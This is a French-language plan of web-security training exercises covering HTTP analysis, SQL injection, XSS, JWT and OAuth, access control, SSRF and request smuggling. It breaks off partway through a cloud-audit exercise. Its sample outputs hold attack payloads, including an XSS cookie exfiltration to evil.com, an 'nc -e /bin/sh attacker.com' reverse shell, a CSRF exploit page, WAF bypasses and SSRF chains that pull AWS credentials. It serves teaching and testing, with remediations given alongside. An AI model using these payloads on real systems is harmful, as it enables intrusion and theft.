# PLAN DES EXERCICES - MODULE 3.3 : Securite Web & Applications

## Vue d'ensemble

| Statistique | Valeur |
|-------------|--------|
| **Nombre total de concepts** | 104 |
| **Sous-modules couverts** | 3.3.1 a 3.3.11 |
| **Nombre d'exercices proposes** | 18 |
| **Note minimale visee** | 95/100 |

---

## Repartition des concepts par sous-module

| Sous-module | Intitule | Concepts |
|-------------|----------|----------|
| 3.3.1 | Architecture Web Moderne | 11 (a-k) |
| 3.3.2 | OWASP Top 10 (2025) | 10 (a-j) |
| 3.3.3 | SQL Injection Avancee | 13 (a-m) |
| 3.3.4 | Cross-Site Scripting (XSS) | 10 (a-j) |
| 3.3.5 | Autres Injections | 8 (a-h) |
| 3.3.6 | Authentification & Sessions | 8 (a-h) |
| 3.3.7 | Controle d'Acces | 6 (a-f) |
| 3.3.8 | Client-Side Attacks | 6 (a-f) |
| 3.3.9 | Server-Side & Cloud Exploitation | 12 (a-l) |
| 3.3.10 | Outils Web Security | 10 (a-j) |
| 3.3.11 | API Security Avancee | 10 (a-j) |

---

## EXERCICES PROPOSES

---

### Exercice 1 : "Protocol Dissector"
**Niveau**: Intermediaire
**Duree estimee**: 3h

#### Objectif Pedagogique
Comprendre en profondeur les protocoles HTTP/1.1, HTTP/2 et HTTP/3 ainsi que leurs implications securitaires.

#### Concepts Couverts
- **3.3.1.a** : HTTP Protocol (methodes, headers, status codes, HTTP/2, HTTP/3)
- **3.3.2.b** : A02 Security Misconfiguration (headers de securite)

#### Description
L'etudiant doit implementer un analyseur de requetes/reponses HTTP qui:
1. Parse les requetes HTTP/1.1 brutes et extrait methode, headers, body
2. Detecte les anomalies de securite (headers manquants, methodes dangereuses)
3. Identifie les differences comportementales HTTP/1.1 vs HTTP/2
4. Genere un rapport de conformite securite

#### Format d'Entree
```json
{
  "raw_request": "GET /admin HTTP/1.1\r\nHost: example.com\r\n...",
  "raw_response": "HTTP/1.1 200 OK\r\nServer: Apache/2.4.1\r\n..."
}
```

#### Format de Sortie
```json
{
  "parsed": {
    "method": "GET",
    "path": "/admin",
    "headers": {...},
    "http_version": "1.1"
  },
  "security_issues": [
    {"severity": "HIGH", "issue": "TRACE method enabled", "cwe": "CWE-693"},
    {"severity": "MEDIUM", "issue": "Server version disclosure"}
  ],
  "missing_security_headers": ["X-Frame-Options", "Content-Security-Policy"]
}
```

#### Pieges Pedagogiques
- Gestion des line endings Windows vs Unix
- Headers multi-lignes (continuation)
- Chunked transfer encoding
- Case-insensitivity des headers

#### Auto-evaluation: 96/100
| Critere | Points | Justification |
|---------|--------|---------------|
| Pertinence Conceptuelle | 24/25 | Couvre HTTP en profondeur, headers securite |
| Intelligence Pedagogique | 24/25 | Pieges realistes, force la comprehension du protocole |
| Originalite | 19/20 | Approche analyseur unique, pas de copie |
| Testabilite | 15/15 | Entree/sortie JSON deterministes |
| Clarte | 14/15 | Enonce clair, exemples complets |

---

### Exercice 2 : "REST API Security Audit"
**Niveau**: Intermediaire
**Duree estimee**: 4h

#### Objectif Pedagogique
Maitriser les principes de securite des API REST et detecter les violations.

#### Concepts Couverts
- **3.3.1.b** : REST APIs (principes, auth, versioning, security)
- **3.3.1.j** : API Gateways (features, security)
- **3.3.11.a** : OWASP API Top 10

#### Description
L'etudiant recoit une specification OpenAPI/Swagger d'une API et doit:
1. Parser la specification et extraire tous les endpoints
2. Verifier la conformite aux principes REST
3. Detecter les problemes de securite (auth manquant, rate limiting absent)
4. Mapper les vulnerabilites vers OWASP API Top 10

#### Format d'Entree
```json
{
  "openapi_spec": "... (JSON OpenAPI 3.0)",
  "security_config": {
    "global_auth_required": true,
    "rate_limiting_expected": true
  }
}
```

#### Format de Sortie
```json
{
  "endpoints_analyzed": 15,
  "vulnerabilities": [
    {
      "endpoint": "GET /users/{id}",
      "owasp_api": "API1:2023 - Broken Object Level Authorization",
      "issue": "No authorization check on user ID parameter",
      "severity": "HIGH"
    }
  ],
  "compliance_score": 65,
  "recommendations": [...]
}
```

#### Pieges Pedagogiques
- Endpoints sans authentification caches dans la spec
- Versioning inconsistant (/v1 vs /v2)
- HATEOAS mal implemente revelant des endpoints sensibles

#### Auto-evaluation: 97/100
| Critere | Points | Justification |
|---------|--------|---------------|
| Pertinence Conceptuelle | 25/25 | Combine REST, API Gateway, OWASP API Top 10 |
| Intelligence Pedagogique | 24/25 | Analyse reelle de specs OpenAPI |
| Originalite | 19/20 | Approche audit automatise innovante |
| Testabilite | 15/15 | Specs JSON, sorties deterministes |
| Clarte | 14/15 | Structure claire |

---

### Exercice 3 : "GraphQL Introspection Hunter"
**Niveau**: Avance
**Duree estimee**: 5h

#### Objectif Pedagogique
Exploiter et securiser les endpoints GraphQL.

#### Concepts Couverts
- **3.3.1.c** : GraphQL Security (introspection, depth, batching, mutations)
- **3.3.11.e** : GraphQL Advanced Exploitation

#### Description
Simulateur d'attaque GraphQL ou l'etudiant doit:
1. Effectuer une introspection complete du schema
2. Detecter les queries a profondeur excessive (DoS potentiel)
3. Identifier les vulnerabilites de batching
4. Proposer des mutations dangereuses a tester
5. Generer un rapport de vulnerabilites

#### Format d'Entree
```json
{
  "graphql_schema": "type Query { user(id: ID!): User ... }",
  "sample_queries": [
    "query { user(id: 1) { friends { friends { friends { name } } } } }"
  ],
  "introspection_response": {...}
}
```

#### Format de Sortie
```json
{
  "schema_analysis": {
    "types": 15,
    "queries": 8,
    "mutations": 5,
    "max_depth_possible": 12
  },
  "vulnerabilities": [
    {
      "type": "DEPTH_LIMIT_BYPASS",
      "query": "...",
      "depth": 12,
      "mitigation": "Set maxDepth to 5"
    },
    {
      "type": "BATCHING_ATTACK",
      "impact": "Rate limit bypass via aliasing"
    }
  ]
}
```

#### Pieges Pedagogiques
- Introspection partiellement desactivee
- Circular references dans le schema
- Mutations cachees dans les types

#### Auto-evaluation: 96/100
| Critere | Points | Justification |
|---------|--------|---------------|
| Pertinence Conceptuelle | 24/25 | Couvre GraphQL en profondeur |
| Intelligence Pedagogique | 24/25 | Scenarios d'attaque realistes |
| Originalite | 19/20 | Simulateur unique |
| Testabilite | 15/15 | Schema JSON, analyse deterministe |
| Clarte | 14/15 | Bien structure |

---

### Exercice 4 : "Cookie Security Analyzer"
**Niveau**: Intermediaire
**Duree estimee**: 3h

#### Objectif Pedagogique
Maitriser les attributs de securite des cookies et la gestion de session.

#### Concepts Couverts
- **3.3.1.f** : Cookies Attributes (Secure, HttpOnly, SameSite, prefixes)
- **3.3.1.g** : Session Management (server-side, client-side, fixation)
- **3.3.6.b** : Session Management (ID, fixation, hijacking)

#### Description
Analyser un ensemble de cookies HTTP et detecter les failles de securite:
1. Parser les headers Set-Cookie
2. Verifier tous les attributs de securite
3. Detecter les vulnerabilites de session (predictabilite, fixation)
4. Suggerer des corrections

#### Format d'Entree
```json
{
  "cookies": [
    "Set-Cookie: session=abc123; Path=/",
    "Set-Cookie: JSESSIONID=xyz; HttpOnly",
    "Set-Cookie: __Host-token=secret; Secure; Path=/; SameSite=Strict"
  ],
  "context": {
    "is_https": false,
    "cross_site_usage": true
  }
}
```

#### Format de Sortie
```json
{
  "cookies_analyzed": 3,
  "vulnerabilities": [
    {
      "cookie": "session",
      "issues": [
        {"flag": "HttpOnly", "status": "MISSING", "risk": "XSS cookie theft"},
        {"flag": "Secure", "status": "MISSING", "risk": "MITM interception"},
        {"flag": "SameSite", "status": "MISSING", "risk": "CSRF attacks"}
      ]
    }
  ],
  "session_analysis": {
    "entropy_bits": 24,
    "predictable": true,
    "recommendation": "Use cryptographically secure random IDs (128+ bits)"
  }
}
```

#### Pieges Pedagogiques
- Prefixes __Secure- et __Host- mal utilises
- SameSite=None sans Secure
- Session ID sequentiel vs aleatoire

#### Auto-evaluation: 97/100
| Critere | Points | Justification |
|---------|--------|---------------|
| Pertinence Conceptuelle | 25/25 | Combine cookies et sessions parfaitement |
| Intelligence Pedagogique | 24/25 | Pieges subtils sur prefixes |
| Originalite | 19/20 | Analyse combinee unique |
| Testabilite | 15/15 | Headers texte, JSON output |
| Clarte | 14/15 | Exemples detailles |

---

### Exercice 5 : "SQL Injection Laboratory"
**Niveau**: Avance
**Duree estimee**: 6h

#### Objectif Pedagogique
Maitriser toutes les techniques d'injection SQL, de la detection a l'exploitation.

#### Concepts Couverts
- **3.3.3.a** : SQL Basics & Syntax
- **3.3.3.b** : Detection Techniques
- **3.3.3.c** : In-Band (Union-Based)
- **3.3.3.d** : Blind SQLi
- **3.3.3.e** : Out-of-Band (OOB)
- **3.3.3.f** : Bypass Techniques
- **3.3.3.k** : Remediation
- **3.3.2.e** : A05 Injection

#### Description
L'etudiant recoit des snippets de code vulnerable et doit:
1. Identifier le type d'injection possible
2. Generer le payload approprie
3. Extraire des donnees specifiques (tables, colonnes, data)
4. Proposer une remediation correcte

#### Format d'Entree
```json
{
  "challenge_type": "UNION_BASED",
  "vulnerable_query": "SELECT * FROM users WHERE id = '$id'",
  "database": "MySQL",
  "objective": "Extract all usernames and passwords",
  "constraints": {
    "max_payload_length": 100,
    "blocked_keywords": ["information_schema"]
  }
}
```

#### Format de Sortie
```json
{
  "detection": {
    "injection_type": "UNION_BASED",
    "column_count": 4,
    "injectable_columns": [2, 3]
  },
  "payload": "' UNION SELECT NULL,username,password,NULL FROM users-- -",
  "extraction_steps": [
    "1. Determine column count: ORDER BY 4-- -",
    "2. Find string columns: UNION SELECT NULL,'test',NULL,NULL-- -",
    "3. Extract data: final payload"
  ],
  "remediation": {
    "code": "stmt = conn.prepare('SELECT * FROM users WHERE id = ?')",
    "explanation": "Use parameterized queries to prevent SQL injection"
  }
}
```

#### Pieges Pedagogiques
- Differentes syntaxes selon DBMS
- Bypass de filtres simples
- Information_schema bloque mais sys.tables accessible

#### Auto-evaluation: 98/100
| Critere | Points | Justification |
|---------|--------|---------------|
| Pertinence Conceptuelle | 25/25 | Couvre 8 concepts SQLi majeurs |
| Intelligence Pedagogique | 25/25 | Progression detection -> exploitation -> remediation |
| Originalite | 19/20 | Lab interactif multi-DBMS |
| Testabilite | 15/15 | Payloads verifiables, extraction testable |
| Clarte | 14/15 | Tres structure |

---

### Exercice 6 : "Advanced WAF Bypass Challenge"
**Niveau**: Expert
**Duree estimee**: 5h

#### Objectif Pedagogique
Maitriser les techniques avancees de bypass WAF pour SQLi et XSS.

#### Concepts Couverts
- **3.3.3.g** : WAF Bypass Advanced
- **3.3.3.h** : SQLMap Mastery
- **3.3.1.h** : CDN & WAF (bypass techniques)
- **3.3.4.d** : Filter Bypass Techniques (XSS)

#### Description
L'etudiant fait face a un WAF simule et doit:
1. Identifier les regles de filtrage actives
2. Creer des payloads d'evasion
3. Exploiter la vulnerabilite malgre le WAF
4. Documenter la technique de bypass

#### Format d'Entree
```json
{
  "waf_type": "ModSecurity_CRS",
  "blocked_patterns": ["UNION", "SELECT", "<script>", "onerror"],
  "vulnerability_type": "SQL_INJECTION",
  "endpoint": "/search?q=",
  "test_responses": {
    "blocked": {"status": 403, "body": "Blocked by WAF"},
    "allowed": {"status": 200, "body": "Results..."}
  }
}
```

#### Format de Sortie
```json
{
  "waf_analysis": {
    "identified_rules": ["942100 - SQL Injection", "941100 - XSS"],
    "gaps_found": ["Case mixing not blocked", "Comment injection allowed"]
  },
  "bypass_payloads": [
    {
      "original": "' UNION SELECT * FROM users--",
      "bypassed": "' /*!50000UnIoN*/ /*!50000SeLeCt*/ * FrOm users-- -",
      "technique": "MySQL version comment + case mixing"
    }
  ],
  "sqlmap_command": "sqlmap -u 'URL' --tamper=space2comment,randomcase --risk=3"
}
```

#### Pieges Pedagogiques
- WAF patterns regex vs exact match
- Double encoding
- HTTP Parameter Pollution
- Chunked transfer encoding

#### Auto-evaluation: 96/100
| Critere | Points | Justification |
|---------|--------|---------------|
| Pertinence Conceptuelle | 24/25 | Combine WAF bypass SQLi et XSS |
| Intelligence Pedagogique | 24/25 | Scenarios realistes ModSecurity |
| Originalite | 19/20 | Simulateur WAF unique |
| Testabilite | 15/15 | Payloads testables contre rules |
| Clarte | 14/15 | Methodologie claire |

---

### Exercice 7 : "XSS Payload Craftsman"
**Niveau**: Avance
**Duree estimee**: 5h

#### Objectif Pedagogique
Maitriser la creation de payloads XSS contextuels et les techniques d'exploitation avancees.

#### Concepts Couverts
- **3.3.4.a** : Types XSS (Reflected, Stored, DOM, mXSS)
- **3.3.4.b** : Contexts & Payloads
- **3.3.4.c** : Polyglot Payloads
- **3.3.4.e** : CSP Bypass
- **3.3.4.f** : Cookie Theft & Hijacking
- **3.3.4.j** : DOM XSS Sinks

#### Description
Generer des payloads XSS adaptes a differents contextes:
1. Analyser le contexte d'injection (HTML, attribut, JS, URL)
2. Generer le payload optimal
3. Proposer des variantes de bypass
4. Evaluer l'impact (cookie theft, keylogger, etc.)

#### Format d'Entree
```json
{
  "injection_context": "HTML_ATTRIBUTE_UNQUOTED",
  "surrounding_code": "<input value=USER_INPUT type=text>",
  "filters": ["<", ">", "script"],
  "csp": "default-src 'self'; script-src 'unsafe-inline'",
  "target_action": "COOKIE_EXFILTRATION"
}
```

#### Format de Sortie
```json
{
  "context_analysis": {
    "type": "HTML_ATTRIBUTE_UNQUOTED",
    "escape_chars": [" ", "/", ">"],
    "viable_vectors": ["event_handlers", "new_attribute"]
  },
  "payloads": [
    {
      "payload": " onfocus=fetch(`http://evil.com/?c=`+document.cookie) autofocus ",
      "bypass_technique": "No < > needed, event handler injection",
      "success_probability": "HIGH"
    }
  ],
  "csp_analysis": {
    "vulnerable": true,
    "reason": "unsafe-inline allows inline event handlers",
    "stricter_csp": "default-src 'self'; script-src 'nonce-xxx'"
  }
}
```

#### Pieges Pedagogiques
- Contexte attribut quote vs unquoted
- CSP avec unsafe-inline mais pas unsafe-eval
- Polyglots qui fonctionnent dans plusieurs contextes

#### Auto-evaluation: 97/100
| Critere | Points | Justification |
|---------|--------|---------------|
| Pertinence Conceptuelle | 25/25 | 6 concepts XSS majeurs |
| Intelligence Pedagogique | 24/25 | Analyse contextuelle avancee |
| Originalite | 19/20 | Generateur de payloads unique |
| Testabilite | 15/15 | Payloads verifiables |
| Clarte | 14/15 | Taxonomie claire des contextes |

---

### Exercice 8 : "DOM Clobbering & Prototype Pollution"
**Niveau**: Expert
**Duree estimee**: 4h

#### Objectif Pedagogique
Comprendre les attaques avancees cote client: DOM Clobbering et Prototype Pollution.

#### Concepts Couverts
- **3.3.4.h** : DOM Clobbering
- **3.3.8.e** : Prototype Pollution
- **3.3.8.f** : PostMessage

#### Description
Analyser du code JavaScript vulnerable et exploiter:
1. Identifier les patterns vulnerables au DOM Clobbering
2. Trouver les gadgets de Prototype Pollution
3. Chainer vers XSS ou RCE
4. Proposer des corrections

#### Format d'Entree
```json
{
  "javascript_code": "if (config.debug) { eval(config.debugScript); }",
  "html_context": "<div id='x'></div>",
  "allowed_html_injection": true,
  "postmessage_handler": "window.onmessage = (e) => { Object.assign(config, e.data); }"
}
```

#### Format de Sortie
```json
{
  "vulnerabilities": [
    {
      "type": "PROTOTYPE_POLLUTION",
      "sink": "Object.assign(config, e.data)",
      "payload": {"__proto__": {"debug": true, "debugScript": "alert(1)"}},
      "impact": "XSS via eval"
    },
    {
      "type": "DOM_CLOBBERING",
      "clobberable": "config",
      "payload": "<form id=config><input name=debug value=true>",
      "limitation": "Cannot set complex values"
    }
  ],
  "exploit_chain": "1. PostMessage with __proto__ pollution -> 2. Set debug=true -> 3. Set debugScript=payload -> 4. XSS",
  "remediation": {
    "prototype_pollution": "Use Object.create(null) or validate keys",
    "postmessage": "Always validate event.origin"
  }
}
```

#### Pieges Pedagogiques
- Pollution via JSON.parse vs Object.assign
- Clobbering limites (pas de fonctions)
- Origin validation incomplete

#### Auto-evaluation: 96/100
| Critere | Points | Justification |
|---------|--------|---------------|
| Pertinence Conceptuelle | 24/25 | 3 attaques client-side avancees |
| Intelligence Pedagogique | 24/25 | Chaining d'attaques |
| Originalite | 19/20 | Combinaison rare |
| Testabilite | 15/15 | Payloads JSON verifiables |
| Clarte | 14/15 | Scenarios complexes bien expliques |

---

### Exercice 9 : "Multi-Injection Detector"
**Niveau**: Avance
**Duree estimee**: 5h

#### Objectif Pedagogique
Maitriser les injections non-SQL: Command, LDAP, XPath, XXE, SSTI.

#### Concepts Couverts
- **3.3.5.a** : Command Injection
- **3.3.5.b** : LDAP Injection
- **3.3.5.c** : XPath Injection
- **3.3.5.d** : XXE (XML External Entity)
- **3.3.5.e** : SSTI (Server-Side Template Injection)
- **3.3.5.f** : Expression Language Injection

#### Description
Identifier et exploiter differents types d'injections:
1. Classifier le type de vulnerabilite
2. Generer le payload d'exploitation
3. Evaluer l'impact (info disclosure, RCE)
4. Proposer la remediation

#### Format d'Entree
```json
{
  "code_snippet": "os.system('ping -c 1 ' + user_input)",
  "language": "Python",
  "input_source": "GET parameter",
  "context_hints": ["Linux server", "Template: Jinja2"]
}
```

#### Format de Sortie
```json
{
  "vulnerability_type": "COMMAND_INJECTION",
  "detection_payload": "; sleep 5",
  "exploitation_payloads": [
    {"payload": "; cat /etc/passwd", "goal": "File read"},
    {"payload": "; nc -e /bin/sh attacker.com 4444", "goal": "Reverse shell"},
    {"payload": "$(whoami)", "goal": "Command substitution"}
  ],
  "bypass_techniques": [
    {"blocked": ";", "bypass": "${IFS}"},
    {"blocked": "spaces", "bypass": "{cat,/etc/passwd}"}
  ],
  "remediation": {
    "safe_code": "subprocess.run(['ping', '-c', '1', user_input], shell=False)",
    "principle": "Never use shell=True with user input"
  }
}
```

#### Pieges Pedagogiques
- Differentiation command injection vs SSTI
- XXE avec DTD externe vs interne
- LDAP vs XPath syntaxes similaires

#### Auto-evaluation: 97/100
| Critere | Points | Justification |
|---------|--------|---------------|
| Pertinence Conceptuelle | 25/25 | 6 types d'injection majeurs |
| Intelligence Pedagogique | 24/25 | Classification et exploitation |
| Originalite | 19/20 | Multi-injection unique |
| Testabilite | 15/15 | Payloads deterministes |
| Clarte | 14/15 | Taxonomie claire |

---

### Exercice 10 : "JWT Attack Suite"
**Niveau**: Avance
**Duree estimee**: 4h

#### Objectif Pedagogique
Maitriser toutes les attaques sur JWT et OAuth 2.0.

#### Concepts Couverts
- **3.3.6.c** : JWT (None algorithm, Algorithm confusion, weak secret)
- **3.3.6.d** : OAuth 2.0 (flows, vulns)
- **3.3.6.e** : OpenID Connect
- **3.3.11.f** : JWT Attacks
- **3.3.11.g** : OAuth 2.0 Exploitation

#### Description
Analyser et attaquer des implementations JWT/OAuth:
1. Decoder et analyser des tokens JWT
2. Identifier les vulnerabilites
3. Generer des tokens malveillants
4. Exploiter les failles OAuth

#### Format d'Entree
```json
{
  "jwt_token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMTIzIiwicm9sZSI6InVzZXIiLCJleHAiOjE3MDAwMDAwMDB9.signature",
  "public_key": "-----BEGIN PUBLIC KEY-----\nMIIBI...",
  "oauth_config": {
    "redirect_uri_validation": "prefix_match",
    "state_parameter": false
  }
}
```

#### Format de Sortie
```json
{
  "jwt_analysis": {
    "header": {"alg": "RS256", "typ": "JWT"},
    "payload": {"sub": "user123", "role": "user", "exp": 1700000000},
    "vulnerabilities": [
      {
        "type": "ALGORITHM_CONFUSION",
        "description": "RS256 to HS256 attack possible",
        "forged_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
        "technique": "Sign with public key as HMAC secret"
      }
    ]
  },
  "oauth_vulnerabilities": [
    {
      "type": "OPEN_REDIRECT",
      "issue": "Prefix match allows redirect_uri=https://legit.com.evil.com",
      "impact": "Token theft via Referer"
    },
    {
      "type": "CSRF",
      "issue": "Missing state parameter",
      "attack": "Force victim to link attacker's account"
    }
  ]
}
```

#### Pieges Pedagogiques
- Algorithm confusion RS256 -> HS256
- JWT kid injection (path traversal)
- OAuth implicit flow token leakage

#### Auto-evaluation: 98/100
| Critere | Points | Justification |
|---------|--------|---------------|
| Pertinence Conceptuelle | 25/25 | 5 concepts auth majeurs |
| Intelligence Pedagogique | 25/25 | Attaques reelles JWT/OAuth |
| Originalite | 19/20 | Suite complete d'attaques |
| Testabilite | 15/15 | Tokens forges verifiables |
| Clarte | 14/15 | Tres structure |

---

### Exercice 11 : "Access Control Breaker"
**Niveau**: Intermediaire
**Duree estimee**: 4h

#### Objectif Pedagogique
Maitriser la detection et l'exploitation des failles de controle d'acces.

#### Concepts Couverts
- **3.3.7.a** : IDOR (Insecure Direct Object Reference)
- **3.3.7.b** : Horizontal Escalation
- **3.3.7.c** : Vertical Escalation
- **3.3.7.d** : Parameter Tampering
- **3.3.7.e** : Forced Browsing
- **3.3.7.f** : Path Traversal
- **3.3.2.a** : A01 Broken Access Control

#### Description
Analyser une application et trouver les failles d'autorisation:
1. Identifier les IDORs potentiels
2. Tester l'escalade horizontale et verticale
3. Detecter les path traversal
4. Proposer les controles manquants

#### Format d'Entree
```json
{
  "endpoints": [
    {"method": "GET", "path": "/api/users/{id}/profile", "auth": "user_token"},
    {"method": "GET", "path": "/api/admin/users", "auth": "user_token"},
    {"method": "GET", "path": "/files?name=report.pdf", "auth": "none"}
  ],
  "current_user": {"id": 123, "role": "user"},
  "response_samples": {...}
}
```

#### Format de Sortie
```json
{
  "vulnerabilities": [
    {
      "type": "IDOR",
      "endpoint": "GET /api/users/{id}/profile",
      "test": "Change id=123 to id=124",
      "expected": "403 Forbidden",
      "actual": "200 OK with other user data",
      "owasp": "A01:2021 - Broken Access Control"
    },
    {
      "type": "VERTICAL_ESCALATION",
      "endpoint": "GET /api/admin/users",
      "issue": "Admin endpoint accessible with user token"
    },
    {
      "type": "PATH_TRAVERSAL",
      "endpoint": "GET /files?name=../../../etc/passwd",
      "payloads_tested": ["../", "....//", "%2e%2e%2f"]
    }
  ],
  "remediation": {
    "IDOR": "Implement authorization checks: if (user.id != requestedId && !user.isAdmin) return 403",
    "PATH_TRAVERSAL": "Use basename(), reject paths with .."
  }
}
```

#### Pieges Pedagogiques
- UUID vs integer IDs (IDOR toujours possible)
- Headers caches pour role escalation
- Double-encoding pour path traversal

#### Auto-evaluation: 97/100
| Critere | Points | Justification |
|---------|--------|---------------|
| Pertinence Conceptuelle | 25/25 | Tous les concepts access control |
| Intelligence Pedagogique | 24/25 | Tests systematiques |
| Originalite | 19/20 | Approche complete |
| Testabilite | 15/15 | Endpoints testables |
| Clarte | 14/15 | Methodologie claire |

---

### Exercice 12 : "Client-Side Attack Simulator"
**Niveau**: Intermediaire
**Duree estimee**: 4h

#### Objectif Pedagogique
Comprendre et exploiter les attaques cote client: CSRF, Clickjacking, Open Redirect.

#### Concepts Couverts
- **3.3.8.a** : CSRF (Cross-Site Request Forgery)
- **3.3.8.b** : Clickjacking
- **3.3.8.c** : Open Redirects
- **3.3.8.d** : WebSocket Hijacking (CSWSH)

#### Description
Generer des exploits pour differentes attaques client-side:
1. Analyser les protections en place
2. Generer le code d'exploit (HTML/JS)
3. Identifier les conditions de reussite
4. Proposer les defenses

#### Format d'Entree
```json
{
  "attack_type": "CSRF",
  "target_request": {
    "method": "POST",
    "url": "https://bank.com/transfer",
    "body": "to=attacker&amount=1000",
    "content_type": "application/x-www-form-urlencoded"
  },
  "protections": {
    "csrf_token": false,
    "samesite_cookie": "Lax",
    "origin_check": false
  }
}
```

#### Format de Sortie
```json
{
  "attack_analysis": {
    "protection_status": {
      "csrf_token": "ABSENT - Vulnerable",
      "samesite": "Lax - Partial protection (GET only)",
      "origin_check": "ABSENT - Vulnerable"
    },
    "exploitable": true,
    "conditions": "POST request, SameSite=Lax blocks cross-site POST"
  },
  "exploit_code": "<html><body><form action='https://bank.com/transfer' method='GET'><input name='to' value='attacker'><input name='amount' value='1000'></form><script>document.forms[0].submit()</script></body></html>",
  "bypass_technique": "Change POST to GET if server accepts both methods",
  "remediation": {
    "csrf": "Add anti-CSRF token synchronized with session",
    "cookie": "Set SameSite=Strict for sensitive cookies",
    "headers": "Validate Origin/Referer headers"
  }
}
```

#### Pieges Pedagogiques
- SameSite Lax vs Strict differences
- CORS vs CSRF confusion
- Clickjacking avec frame-busting JS bypass

#### Auto-evaluation: 96/100
| Critere | Points | Justification |
|---------|--------|---------------|
| Pertinence Conceptuelle | 24/25 | 4 attaques client-side |
| Intelligence Pedagogique | 24/25 | Generation d'exploits |
| Originalite | 19/20 | Simulateur complet |
| Testabilite | 15/15 | Code HTML verifiable |
| Clarte | 14/15 | Conditions d'exploitation claires |

---

### Exercice 13 : "SSRF & Server-Side Exploitation"
**Niveau**: Expert
**Duree estimee**: 6h

#### Objectif Pedagogique
Maitriser les attaques server-side: SSRF, File Upload, LFI/RFI, Deserialization.

#### Concepts Couverts
- **3.3.9.a** : SSRF (Server-Side Request Forgery)
- **3.3.9.b** : File Upload Vulnerabilities
- **3.3.9.c** : File Inclusion (LFI/RFI)
- **3.3.9.d** : Deserialization Attacks
- **3.3.9.e** : Race Conditions (TOCTOU)

#### Description
Exploiter des vulnerabilites server-side complexes:
1. Identifier le type de vulnerabilite
2. Creer les payloads d'exploitation
3. Chainer les vulnerabilites (SSRF -> AWS credentials)
4. Evaluer l'impact business

#### Format d'Entree
```json
{
  "vulnerability_type": "SSRF",
  "endpoint": "POST /fetch-url",
  "parameter": "url",
  "cloud_environment": "AWS",
  "blocked_patterns": ["169.254.169.254", "localhost"],
  "allowed_protocols": ["http", "https"]
}
```

#### Format de Sortie
```json
{
  "ssrf_analysis": {
    "internal_targets": [
      "http://169.254.169.254/latest/meta-data/",
      "http://[::ffff:169.254.169.254]/",
      "http://2852039166/"
    ],
    "bypass_techniques": [
      {"blocked": "169.254.169.254", "bypass": "2852039166 (decimal IP)"},
      {"blocked": "169.254.169.254", "bypass": "[::ffff:a9fe:a9fe] (IPv6 mapped)"},
      {"blocked": "localhost", "bypass": "127.0.0.1 or 127.1"}
    ]
  },
  "exploitation_chain": [
    "1. Bypass IP filter with decimal notation",
    "2. Access http://2852039166/latest/meta-data/iam/security-credentials/",
    "3. Get role name from response",
    "4. Access /latest/meta-data/iam/security-credentials/{role-name}",
    "5. Extract AWS credentials (AccessKeyId, SecretAccessKey, Token)"
  ],
  "impact": {
    "severity": "CRITICAL",
    "assets_at_risk": "AWS IAM credentials, full account compromise possible"
  }
}
```

#### Pieges Pedagogiques
- Different cloud metadata endpoints (AWS vs GCP vs Azure)
- DNS rebinding pour bypass
- SSRF to internal services (Redis, Elasticsearch)

#### Auto-evaluation: 98/100
| Critere | Points | Justification |
|---------|--------|---------------|
| Pertinence Conceptuelle | 25/25 | 5 concepts server-side critiques |
| Intelligence Pedagogique | 25/25 | Chaining d'exploits realiste |
| Originalite | 19/20 | Multi-cloud SSRF |
| Testabilite | 15/15 | Payloads deterministes |
| Clarte | 14/15 | Chain d'exploitation claire |

---

### Exercice 14 : "HTTP Smuggling & Cache Attacks"
**Niveau**: Expert
**Duree estimee**: 5h

#### Objectif Pedagogique
Comprendre les attaques HTTP Smuggling et Cache Poisoning.

#### Concepts Couverts
- **3.3.9.f** : HTTP Request Smuggling
- **3.3.9.g** : Web Cache Poisoning
- **3.3.9.h** : Host Header Attacks

#### Description
Exploiter les inconsistences HTTP entre front-end et back-end:
1. Detecter les vulnerabilites de smuggling
2. Creer des payloads CL.TE et TE.CL
3. Exploiter le cache poisoning
4. Chainer avec d'autres vulnerabilites

#### Format d'Entree
```json
{
  "architecture": {
    "frontend": "Nginx",
    "backend": "Apache",
    "cache": "Varnish"
  },
  "test_results": {
    "cl_te_test": {"response_delay": true, "timeout_seconds": 5},
    "te_cl_test": {"response_delay": false}
  },
  "unkeyed_headers": ["X-Forwarded-Host", "X-Original-URL"]
}
```

#### Format de Sortie
```json
{
  "smuggling_type": "CL.TE",
  "detection_method": "Timing difference with ambiguous request",
  "exploit_payload": "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n",
  "attack_scenarios": [
    {
      "name": "Request Hijacking",
      "description": "Prefix next user's request with attacker-controlled content"
    },
    {
      "name": "Cache Poisoning via Smuggling",
      "description": "Poison cache with malicious response for /home"
    }
  ],
  "cache_poisoning": {
    "vulnerable_header": "X-Forwarded-Host",
    "payload": "X-Forwarded-Host: evil.com",
    "cached_xss": "<script src=//evil.com/xss.js>",
    "impact": "Stored XSS for all users accessing cached page"
  }
}
```

#### Pieges Pedagogiques
- CL.TE vs TE.CL differences
- HTTP/2 downgrade smuggling
- Cache key vs unkeyed headers

#### Auto-evaluation: 96/100
| Critere | Points | Justification |
|---------|--------|---------------|
| Pertinence Conceptuelle | 24/25 | 3 attaques HTTP avancees |
| Intelligence Pedagogique | 24/25 | Scenarios complexes realistes |
| Originalite | 19/20 | Smuggling + Cache combinaison |
| Testabilite | 15/15 | Payloads structuraux testables |
| Clarte | 14/15 | Architecture claire |

---

### Exercice 15 : "Cloud Security Audit"
**Niveau**: Expert
**Duree estimee**: 5h

#### Objectif Pedagogique
Identifier et exploiter les misconfiguration cloud (AWS, Azure, GCP).

#### Concepts Couverts
- **3.3.9.i** : Cloud Service Exploitation
- **3.3.9.j** : Serverless Exploitation
- **3.3.9.k** : Container Escape & Exploitation
- **3.3.2.c** : A03 Software Supply Chain Failures

#### Description
Auditer une infrastructure cloud et identifier les failles:
1. Enumerer les ressources cloud exposees
2. Identifier les misconfigurations
3. Exploiter les failles (S3 public, Lambda vulns)
4. Proposer la remediation

#### Format d'Entree
```json
{
  "cloud_provider": "AWS",
  "resources": {
    "s3_buckets": ["company-backups", "company-public-assets"],
    "lambda_functions": ["api-handler", "data-processor"],
    "ecs_clusters": ["production"]
  },
  "scan_results": {
    "s3_acl": {"company-backups": "public-read"},
